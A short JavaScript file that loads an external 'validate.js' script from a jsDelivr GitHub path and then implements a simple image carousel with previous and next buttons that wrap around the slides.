(function() {
  var script = document.createElement("script");
  script.src = "https://cdn.jsdelivr.net/gh/gracehoppercenter/validate@1.0.5/validate.js";
  script.async = false;
  document.head.appendChild(script);
})();


const carouselItems = document.querySelectorAll('.carousel-item');
const prevButton = document.querySelector('.btn-prev');
const nextButton = document.querySelector('.btn-next');

let currentIndex = 0; 

function changeSlide(newIndex) {
  document.querySelector('.carousel-item.active').classList.remove('active');
  
  carouselItems[newIndex].classList.add('active');
  
  currentIndex = newIndex;
}

nextButton.addEventListener('click', () => {
  let nextIndex = currentIndex + 1;
  
  if (nextIndex >= carouselItems.length) {
    nextIndex = 0;
  }
  changeSlide(nextIndex);
});

prevButton.addEventListener('click', () => {
  let prevIndex = currentIndex - 1;
  
  if (prevIndex < 0) {
    prevIndex = carouselItems.length - 1;
  }
  changeSlide(prevIndex);
});

